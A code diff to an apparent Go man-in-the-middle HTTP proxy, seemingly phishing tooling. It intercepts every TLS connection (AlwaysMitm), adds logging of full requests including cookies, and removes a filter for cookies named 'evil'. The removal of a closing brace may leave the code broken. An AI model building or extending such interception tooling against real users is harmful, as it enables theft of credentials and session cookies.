@@ -150,6 +150,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		req.URL.Scheme = "https"
 		req.URL.Host = req.Host
 		p.Proxy.ServeHTTP(w, req)
+		log.Info("NON PROXY REQUESTS: %v", req)
 	})
 
 	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)
@@ -157,7 +158,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.Proxy.OnRequest().
 		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
 			log.Info("Request Headers: %v", req.Header)
-
+			
 			ps := &ProxySession{
 				SessionId:    "",
 				Created:      false,
@@ -877,25 +878,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-				// Define the substring to check for in cookie names
-				substringToCheck := "evil"
-			
-			    	// Filter out the cookies that contain the substring
-			    	filteredCookies := []*http.Cookie{}
-			    	for _, cookie := range req.Cookies() {
-					if !strings.Contains(cookie.Name, substringToCheck) {
-				    	filteredCookies = append(filteredCookies, cookie)
-					}
-			    	}
-			
-			    	// Clear the existing cookies in the request header
-			    	req.Header.Del("Cookie")
-			
-			    	// Add the filtered cookies back to the request header
-			    	for _, cookie := range filteredCookies {
-					req.AddCookie(cookie)
-			    	}
-			}
+				
 
 			return req, nil
 		})
